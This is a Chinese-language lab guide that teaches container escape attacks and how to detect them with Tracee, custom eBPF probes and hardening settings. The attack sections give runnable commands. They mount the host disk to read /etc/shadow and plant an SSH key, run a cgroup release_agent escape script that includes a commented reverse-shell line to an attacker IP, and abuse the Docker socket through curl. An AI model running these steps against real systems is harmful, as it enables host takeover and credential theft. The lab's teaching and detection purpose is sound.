# 实验三：容器逃逸攻击与检测

> 本实验学习容器逃逸的攻击手法和检测方法，包括特权容器逃逸、Cgroup Release Agent 逃逸等。

---

## 实验目标

完成本实验后，你将能够：

1. 理解容器隔离机制和逃逸原理
2. 复现多种容器逃逸攻击手法
3. 用 Tracee 检测容器逃逸行为
4. 理解 Tracee 的容器逃逸检测签名实现

---

## 实验环境

| 要求 | 说明 |
|------|------|
| 系统 | Linux 虚拟机（推荐 Ubuntu 20.04/22.04） |
| 内核 | 5.4 以上 |
| 软件 | Docker 已安装、Tracee 已部署 |
| 权限 | 需要 root 权限 |

### 环境检查

```bash
# 检查 Docker
docker --version
docker run hello-world

# 检查 Tracee
sudo tracee --version

# 检查内核版本
uname -r
```

---

## 第一部分：前置知识（10分钟速览）

### 1.1 容器不是虚拟机

```
虚拟机：完全隔离                容器：共享内核
┌─────────────────────┐        ┌─────────────────────┐
│   App     App       │        │   App     App       │
├─────────────────────┤        ├─────────────────────┤
│   Guest OS          │        │  Namespace 隔离     │
├─────────────────────┤        │  （视图隔离）        │
│   Hypervisor        │        │                     │
├─────────────────────┤        │  共享的 Linux 内核   │
│   Host OS           │        ├─────────────────────┤
└─────────────────────┘        │   Host OS           │
                               └─────────────────────┘
```

**关键理解**：容器与宿主机共享同一个内核，这是容器逃逸可能发生的根本原因。

### 1.2 容器隔离机制

| 机制 | 作用 | 逃逸风险 |
|------|------|----------|
| **Namespace** | 隔离"看到什么"（PID、网络、文件系统等） | 可通过 nsenter 突破 |
| **Cgroup** | 限制"能用多少"（CPU、内存等） | release_agent 可被滥用 |
| **Capabilities** | 细粒度权限���制 | CAP_SYS_ADMIN 等高危能力 |
| **Seccomp** | 系统调用过滤 | --privileged 会禁用 |

### 1.3 特权容器的危险

```bash
# 普通容器
docker run -it ubuntu bash
# → 删除了大部分 capabilities
# → 启用 seccomp 过滤
# → 无法访问宿主机设备

# 特权容器
docker run --privileged -it ubuntu bash
# → 拥有所有 capabilities
# → 禁用 seccomp
# → 可以访问所有设备
# → 几乎等于宿主机 root！
```

### 1.4 常见逃逸类型

| 类型 | 前提条件 | 危害 |
|------|----------|------|
| 特权容器挂载 | --privileged | 直接访问宿主机文件系统 |
| Cgroup Release Agent | CAP_SYS_ADMIN | 在宿主机执行命令 |
| Docker Socket | 挂载了 docker.sock | 创建特权容器 |
| /proc 逃逸 | CAP_SYS_ADMIN | 修改 core_pattern |
| 内核漏洞 | 存在漏洞 | 直接突破隔离 |

---

## 第二部分：特权容器逃逸

### 2.1 攻击原理

特权容器拥有所有 capabilities，可以：
- 挂载宿主机磁盘
- 访问 /proc/1/root（宿主机根目录）
- 使用 debugfs 等工具

### 2.2 ���击步骤

**步骤 1：启动特权容器**

```bash
# 启动一个特权容器
docker run --privileged -it ubuntu bash
```

**步骤 2：方法一 - 挂载宿主机磁盘**

```bash
# 在容器内执行

# 1. 查看可用磁盘
fdisk -l
# 找到宿主机的磁盘，如 /dev/sda1

# 2. 挂载宿主机磁盘
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# 3. 访问宿主机文件
ls /mnt/host/
cat /mnt/host/etc/shadow

# 4. 写入恶意文件（如 SSH 公钥）
echo "your-ssh-public-key" >> /mnt/host/root/.ssh/authorized_keys

# 5. 使用 chroot 获得完整宿主机环境
chroot /mnt/host /bin/bash
```

**步骤 3：方法二 - 通过 /proc 访问**

```bash
# 在特权容器内

# 直接访问宿主机 PID 1 的根目录
ls -la /proc/1/root/
cat /proc/1/root/etc/shadow
```

### 2.3 Tracee 检测

```bash
# 终端 1：启动 Tracee 监控
sudo tracee --events security_sb_mount,security_file_open \
    --filter container=true

# 终端 2：执行逃逸
docker run --privileged -it ubuntu bash -c "
    mkdir /mnt/host &&
    mount /dev/sda1 /mnt/host &&
    cat /mnt/host/etc/shadow
"

# 观察 Tracee 输出
# 应该能看到容器内的 mount 和敏感文件访问事件
```

### 2.4 清理

```bash
# 删除测试容器
docker ps -a | grep ubuntu | awk '{print $1}' | xargs docker rm -f
```

---

## 第三部分：Cgroup Release Agent 逃逸

### 3.1 攻击原理

Cgroup v1 有一个 `release_agent` 机制：
- 当 cgroup 中最后一个进程退出时，会执行 release_agent 指定的程序
- 这个程序在**宿主机上下文**中执行
- 攻击者可以设置 release_agent 指向恶意脚本

```
容器内：
  1. 挂载 cgroup
  2. 创建子 cgroup
  3. 设置 notify_on_release = 1
  4. 设置 release_agent = 恶意脚本路径
  5. 将进程加入 cgroup 后退出
      │
      ▼
宿主机：
  内核执行 release_agent 指定的程序
  → 以 root 权限运行！
```

### 3.2 攻击步骤

**注意**：此攻击需要 CAP_SYS_ADMIN 能力，通常在特权容器中可用。

```bash
# 启动特权容器
docker run --privileged -it ubuntu bash
```

**在容器内执行：**

```bash
#!/bin/bash

# Step 1: 挂载 cgroup 文件系统
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 2: 创建子 cgroup
mkdir /tmp/cgrp/escape

# Step 3: 启用 notify_on_release
echo 1 > /tmp/cgrp/escape/notify_on_release

# Step 4: 获取容器在宿主机上的路径
# 这是关键步骤：找到容器文件系统在宿主机上的路径
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "Container path on host: $host_path"

# Step 5: 设置 release_agent
# 指向我们要在宿主机上执行的脚本
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 6: 在容器内创建恶意脚本
cat > /cmd << 'SCRIPT'
#!/bin/sh
# 这个脚本将在宿主机上以 root 权限执行！

# 示例：读取宿主机的 /etc/shadow
cat /etc/shadow > /tmp/escape_result

# 或者：创建反弹 shell
# bash -i >& /dev/tcp/attacker_ip/4444 0>&1
SCRIPT
chmod +x /cmd

# Step 7: 触发逃逸
# 将当前 shell 的 PID 写入 cgroup.procs，然后立即退出
# 这会触发 release_agent
sh -c "echo \$\$ > /tmp/cgrp/escape/cgroup.procs"

# Step 8: 检查结果
sleep 1
cat /tmp/escape_result
```

### 3.3 Tracee 检测

Tracee 有专门的签名检测 Cgroup Release Agent 逃逸：

```bash
# 终端 1：启动 Tracee 检测签名
sudo tracee --events cgroup_release_agent,cgroup_notify_on_release

# 终端 2：执行逃逸攻击
# （执行上面的攻击步骤）

# 预期输出：
# TIME             UID  COMM    PID    EVENT
# 14:32:15.123456  0    bash    12345  cgroup_release_agent
# 14:32:14.123456  0    bash    12345  cgroup_notify_on_release
```

### 3.4 检测原理

Tracee 的检测逻辑（简化版）：

```go
// 监控 security_file_open 事件
// 检查是否写入 release_agent 或 notify_on_release 文件
func OnEvent(event Event) {
    if event.Name == "security_file_open" {
        if IsWriteAccess(event.Flags) {
            filename := path.Base(event.Pathname)
            if filename == "release_agent" || filename == "notify_on_release" {
                // 来自容器
                if event.Origin == "container" {
                    // 触发告警！
                    Alert("Cgroup Escape Attempt")
                }
            }
        }
    }
}
```

---

## 第四部分：Docker Socket 逃逸

### 4.1 攻击原理

如果容器内可以访问 Docker Socket (`/var/run/docker.sock`)，攻击者可以：
- 调用 Docker API
- 创建新的特权容器
- 挂载宿主机根目录

### 4.2 攻击步骤

**步骤 1：启动挂载了 Docker Socket 的容器**

```bash
# 模拟不安全的配置（常见于 CI/CD 环境）
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash
```

**步骤 2：在容器内安装 Docker CLI**

```bash
# 在容器内
apt update && apt install -y curl

# 或者直接使用 curl 调用 API
```

**步骤 3：使用 Docker API 逃逸**

```bash
# 方式一：如果有 docker 命令
docker run -it --privileged -v /:/host ubuntu chroot /host

# 方式二：直接调用 API
# 创建特权容器
curl -X POST -H "Content-Type: application/json" \
    --unix-socket /var/run/docker.sock \
    -d '{
        "Image": "ubuntu",
        "Cmd": ["/bin/bash", "-c", "cat /host/etc/shadow"],
        "HostConfig": {
            "Privileged": true,
            "Binds": ["/:/host"]
        }
    }' \
    http://localhost/containers/create?name=escape

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
    http://localhost/containers/escape/start

# 查看日志
curl --unix-socket /var/run/docker.sock \
    http://localhost/containers/escape/logs?stdout=true
```

### 4.3 Tracee 检测

```bash
# 使用 Tracee 的 docker_abuse 签名
sudo tracee --events docker_abuse

# 或监控 Socket 连接
sudo tracee --events security_socket_connect,security_file_open \
    --filter 'event.args.pathname=*/docker.sock'
```

---

## 第五部分：使用 Tracee 全面检测

### 5.1 容器逃逸检测策略

创建一个 Tracee 策略文件 `escape-detection.yaml`：

```yaml
apiVersion: tracee.aquasecurity.github.io/v1beta1
kind: Policy
metadata:
  name: container-escape-detection
spec:
  scope:
    - container=true

  rules:
    # 1. Cgroup 逃逸
    - event: cgroup_release_agent
    - event: cgroup_notify_on_release

    # 2. Docker Socket 滥用
    - event: docker_abuse

    # 3. 磁盘挂载
    - event: disk_mount

    # 4. /proc 滥用
    - event: proc_kcore_read

    # 5. 原始事件（用于自定义分析）
    - event: security_sb_mount
    - event: security_file_open
      filters:
        - data.pathname=**/release_agent
        - data.pathname=**/notify_on_release
        - data.pathname=**/docker.sock
```

### 5.2 运行综合检测

```bash
# 使用策略文件
sudo tracee --policy escape-detection.yaml

# 或直接指定所有相关签名
sudo tracee --events \
    cgroup_release_agent,\
    cgroup_notify_on_release,\
    docker_abuse,\
    disk_mount,\
    proc_kcore_read
```

### 5.3 检测结果分析

```
TIME             UID    COMM     PID     EVENT                      ARGS
14:32:10.111111  0      mount    12340   disk_mount                 dev_name: /dev/sda1
14:32:15.222222  0      bash     12345   cgroup_notify_on_release   pathname: /sys/fs/cgroup/.../notify_on_release
14:32:15.333333  0      bash     12345   cgroup_release_agent       pathname: /sys/fs/cgroup/.../release_agent
14:32:20.444444  0      curl     12346   docker_abuse               pathname: /var/run/docker.sock

告警分析：
├── disk_mount：特权容器挂载宿主机磁盘
├── cgroup_notify_on_release：Cgroup 逃逸准备阶段
├── cgroup_release_agent：Cgroup 逃逸执行阶段
└── docker_abuse：Docker Socket 被访问
```

---

## 第六部分：自己实现容器逃逸检测

### 6.1 检测 release_agent 修改

基于实验一的代码，添加 Cgroup 逃逸检测：

```c
// 在 eBPF 程序中添加

SEC("kprobe/security_file_open")
int BPF_KPROBE(trace_cgroup_escape, struct file *file)
{
    // 获取文件名
    char filename[64] = {};
    // ... 获取文件名的代码 ...

    // 检查是否为 release_agent
    bool is_release_agent = (filename[0] == 'r' && filename[1] == 'e' &&
                             filename[2] == 'l' && filename[3] == 'e' &&
                             filename[4] == 'a' && filename[5] == 's' &&
                             filename[6] == 'e' && filename[7] == '_' &&
                             filename[8] == 'a' && filename[9] == 'g' &&
                             filename[10] == 'e' && filename[11] == 'n' &&
                             filename[12] == 't' && filename[13] == '\0');

    // 检查是否为写操作
    u32 flags;
    BPF_CORE_READ_INTO(&flags, file, f_flags);
    bool is_write = (flags & (O_WRONLY | O_RDWR)) != 0;

    if (is_release_agent && is_write) {
        // 检查是否来自容器（通过 cgroup ID 判断）
        u64 cgroup_id = bpf_get_current_cgroup_id();
        // 发送告警事件
        // ...
    }

    return 0;
}
```

### 6.2 检测容器内磁盘挂载

```c
SEC("kprobe/security_sb_mount")
int BPF_KPROBE(trace_mount, const char *dev_name)
{
    char device[32] = {};
    bpf_probe_read_user_str(&device, sizeof(device), dev_name);

    // 检查是否挂载 /dev/ 下的设备
    if (device[0] == '/' && device[1] == 'd' &&
        device[2] == 'e' && device[3] == 'v' &&
        device[4] == '/') {

        // 检查是否在容器中
        u64 cgroup_id = bpf_get_current_cgroup_id();
        // 如果是容器且不是启动阶段，发送告警
        // ...
    }

    return 0;
}
```

---

## 第七部分：防护建议

### 7.1 避免使用特权容器

```yaml
# Kubernetes Pod 安全配置
securityContext:
  privileged: false
  allowPrivilegeEscalation: false
  capabilities:
    drop:
      - ALL
```

### 7.2 不要挂载 Docker Socket

```yaml
# 避免这样做
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # 危险！
```

### 7.3 使用 Seccomp 限制系统调用

```json
{
    "defaultAction": "SCMP_ACT_ERRNO",
    "syscalls": [
        {
            "names": ["mount", "umount", "umount2"],
            "action": "SCMP_ACT_ERRNO"
        }
    ]
}
```

### 7.4 启用运行时检测

```bash
# 部署 Tracee 作为 DaemonSet
# 持续监控容器逃逸行为
```

---

## 思考题

1. **除了本实验介绍的方法，还有哪些容器逃逸手法？**
   - 提示：内核漏洞（Dirty Pipe）、runc 漏洞（CVE-2019-5736）

2. **如何检测容器内的进程尝试访问宿主机的 /proc/1/root？**
   - 提示：监控文件访问 + 路径匹配

3. **Cgroup v2 是否存在类似的 release_agent 逃逸风险？**
   - 提示：Cgroup v2 的 release_agent 机制有所不同

---

## 相关文档

| 文档 | 说明 |
|------|------|
| [容器逃逸技术调研](container-escape-research.md) | 完整的容器逃逸技术分析 |
| [检测设计方法论](detection-design-methodology.md) | 从攻击推导检测规则 |
| [签名引擎详解](signature-engine.md) | Tracee 签名实现原理 |

---

## 参考资料

- [Docker Security](https://docs.docker.com/engine/security/)
- [Container Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [HackTricks - Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [MITRE ATT&CK - T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/)

---

_最后更新：2026-02-15_
